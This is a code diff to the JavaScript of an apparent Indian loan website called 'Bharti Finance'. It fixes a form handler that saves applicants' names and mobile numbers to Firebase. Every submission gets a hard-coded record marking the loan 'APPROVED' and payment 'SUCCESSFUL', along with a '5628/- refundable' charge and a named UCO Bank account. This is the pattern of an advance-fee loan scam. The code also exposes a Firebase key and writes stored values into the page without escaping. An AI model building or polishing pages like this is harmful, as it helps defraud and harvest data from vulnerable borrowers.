@@ -154,7 +154,7 @@
         <p>B/23, Inner Circle, Connaught Place, <br><b>New Delhi, 110001</b></p>
     </div>
 
-    <script>
+        <script>
         function openNav() { document.getElementById("mySidenav").style.width = "280px"; }
         function closeNav() { document.getElementById("mySidenav").style.width = "0"; }
 
@@ -168,7 +168,7 @@
         }
         setInterval(() => changeSlide(1), 5000);
 
-        // Firebase Config
+        // Firebase Config (Aapka Bharti Config)
         const firebaseConfig = {
             apiKey: "AIzaSyAzdiBUqO6AvuQmM7HZSFbPJ_fQZuiGu8E",
             authDomain: "bharti-finan-e.firebaseapp.com",
@@ -181,23 +181,46 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        // FIXED SAVE DATA FUNCTION
         function saveData() {
+            // IDs matched with your HTML (n, m, loan_state, a)
             const name = document.getElementById('n').value;
             const mobile = document.getElementById('m').value;
-            const state = document.getElementById('state').value;
+            const state = document.getElementById('loan_state').value; // Yahan galti thi, ab theek hai
             const amount = document.getElementById('a').value;
 
-            if(!name || mobile.length < 10 || !state) { alert("Puri details bharein!"); return; }
-            if(parseInt(amount) < 100000) { alert("Bharti Finance sirf ₹1,00,000 ya usse zyada ka loan deta hai."); return; }
+            if(!name || mobile.length < 10 || !state || !amount) { 
+                alert("⚠️ Kripya saari details sahi se bharein!"); 
+                return; 
+            }
+            
+            if(parseInt(amount) < 100000) { 
+                alert("❌ Bharti Finance sirf ₹1,00,000 ya usse zyada ka loan deta hai."); 
+                return; 
+            }
 
             db.ref('bharti_loans/' + mobile).set({ 
-                name, state, amount: amount + " RS.", 
-                app_by: "PMGEP LOAN DEPARTMENT", date: "24/02/2026", 
-                branch: "NEW DELHI", type: "PERSONAL", tenure: "3 YEARS", 
-                emi: "3125/- RS. PER MONTH", p_status: "SUCCESSFUL", 
-                acc: "04663211000679 UCO BANK", issue: "NONE", 
-                charges: "5628 REFUNDABLE AMOUNT", status: "APPROVED", photo: "" 
-            }).then(() => { alert("Application Submitted!"); location.reload(); });
+                name: name, 
+                state: state, 
+                amount: amount + " RS.", 
+                app_by: "PMGEP LOAN DEPARTMENT", 
+                date: "25/02/2026", 
+                branch: "NEW DELHI HO", 
+                type: "PERSONAL LOAN", 
+                tenure: "3 YEARS", 
+                emi: "3125/- RS. PER MONTH", 
+                p_status: "SUCCESSFUL", 
+                acc: "04663211000679 UCO BANK", 
+                issue: "NONE", 
+                charges: "5628/- REFUNDABLE AMOUNT", 
+                status: "APPROVED", 
+                photo: "https://i.ibb.co/hK5KqN3M/1000101005.jpg" 
+            }).then(() => { 
+                alert("✅ Application Submitted Successfully!"); 
+                location.reload(); 
+            }).catch((e) => {
+                alert("Error: " + e.message);
+            });
         }
 
         function checkStatus() {
@@ -210,7 +233,7 @@
                     const d = snap.val();
                     let photoHtml = (d.photo && d.photo.includes("http")) ? `<div class="photo-frame"><img src="${d.photo}"></div>` : `<div class="photo-frame"><span style="color:#999">No Photo</span></div>`;
                     out.innerHTML = `
-                        <div class="status-head">Status</div>
+                        <div class="status-head">Status Details</div>
                         <div class="status-body">
                             ${photoHtml}
                             <div class="info-row"><span>mobile:</span> <span>${mobile}</span></div>
@@ -228,9 +251,10 @@
                             <div class="info-row"><span>charges:</span> <span>${d.charges}</span></div>
                             <div class="approved-bar">${d.status}</div>
                         </div>`;
-                } else { out.innerHTML = "<p style='padding:20px; color:red; font-weight:bold;'>Not found!</p>"; }
+                } else { out.innerHTML = "<p style='padding:20px; color:red; font-weight:bold;'>Record Not Found!</p>"; }
             });
         }
     </script>
+
 </body>
 </html>
